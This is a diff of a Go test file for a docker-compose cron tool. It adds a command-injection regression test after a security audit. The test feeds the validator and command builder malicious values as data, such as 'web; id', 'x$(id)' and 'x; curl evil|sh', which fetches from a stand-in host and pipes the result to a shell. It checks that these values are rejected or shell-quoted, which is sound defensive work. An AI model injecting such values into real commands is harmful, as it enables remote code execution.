@@ -313,9 +313,33 @@ func TestBuildCommandCompose(t *testing.T) {
 	job := &CronJob{Carrier: CarrierCompose, ProjectName: "demo", Service: "migrate"}
 	sc := &CronScript{Type: ScriptComposeRun}
 	cmd := buildCommand(job, sc, "", "--label custos.cron.run=1", "demo")
-	want := "docker compose -p demo -f /opt/custos-machina/compose/demo/compose.yaml run --rm --label custos.cron.run=1 migrate"
+	want := "docker compose -p 'demo' -f '/opt/custos-machina/compose/demo/compose.yaml' run --rm --label custos.cron.run=1 'migrate'"
 	if cmd != want {
 		t.Errorf("compose 命令不符\n got %q\nwant %q", cmd, want)
+	}
+}
+
+// 命令注入回归（v0.12.0 审计严重项 2）：
+// ① validateCarrier 的 shell/python × compose 分支曾提前 return 旁路 svcRe 白名单；
+// ② buildCommand 曾裸拼 domain/service——即使上游漏校验，拼装层也必须引号化。
+func TestBuildCommandInjectionGuard(t *testing.T) {
+	// ① 白名单旁路修复：恶意 service/project 在所有组合下都被拒
+	for _, st := range []string{ScriptShell, ScriptPython, ScriptComposeRun} {
+		if err := validateCarrier(st, CarrierCompose, "", "proj", "web; id"); err == nil {
+			t.Errorf("%s × compose：service 含 shell 元字符应被拒绝", st)
+		}
+		if err := validateCarrier(st, CarrierCompose, "", "x$(id)", "web"); err == nil {
+			t.Errorf("%s × compose：project 含 $() 应被拒绝", st)
+		}
+	}
+	// ② 拼装层引号化：携带元字符的值以完整引号段出现在命令里
+	//（shellQuote 对内嵌单引号有 '\'' 转义，外层语义不可能被逃逸）
+	job := &CronJob{Carrier: CarrierCompose, ProjectName: "x; curl evil|sh", Service: "web; id"}
+	cmd := buildCommand(job, &CronScript{Type: ScriptComposeRun}, "", "--label L", "x$(id)")
+	if !strings.Contains(cmd, "-p 'x$(id)'") ||
+		!strings.Contains(cmd, "-f '/opt/custos-machina/compose/x$(id)/compose.yaml'") ||
+		!strings.Contains(cmd, " 'web; id'") {
+		t.Errorf("domain/service/composeFile 应被 shellQuote 完整包裹: %q", cmd)
 	}
 }
 
@@ -605,7 +629,7 @@ func TestManualJobAndNetwork(t *testing.T) {
 	// network 拼装
 	cmd := buildCommand(&CronJob{Carrier: CarrierRun, Image: "alpine:3", Network: "demo-prod-blue_default"},
 		&CronScript{Type: ScriptShell}, "", "--label L", "")
-	if !strings.Contains(cmd, "--network demo-prod-blue_default") {
+	if !strings.Contains(cmd, "--network 'demo-prod-blue_default'") {
 		t.Errorf("docker run 应带 --network: %q", cmd)
 	}
 	// 未设 network 不加标志
